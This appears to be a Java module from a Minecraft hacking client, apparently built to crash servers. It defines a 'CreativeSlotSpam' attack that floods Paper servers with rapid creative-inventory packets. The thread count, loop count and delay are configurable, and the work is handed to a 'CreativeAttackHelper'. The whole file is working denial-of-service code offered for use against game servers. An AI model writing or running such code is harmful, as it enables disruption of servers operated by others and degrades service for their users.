package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeSlotSpam extends Module {
	private ScheduledExecutorService executorService;

	public CreativeSlotSpam() {
		super("CreativeSlotSpam", "Paper rapid creative-slot inventory sync pressure (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("slotCount", ArgumentType.INT, 1, 46, "46");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 100, "30");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int slotCount = context.getInt("slotCount");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		ItemStack item = new ItemStack(ItemType.STONE.getId(protocol), 64, null);

		executorService = CreativeAttackHelper.start(
				this,
				context,
				executorService,
				packets,
				threadSleep,
				loopAmount,
				iteration -> iteration % slotCount,
				ignored -> item
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
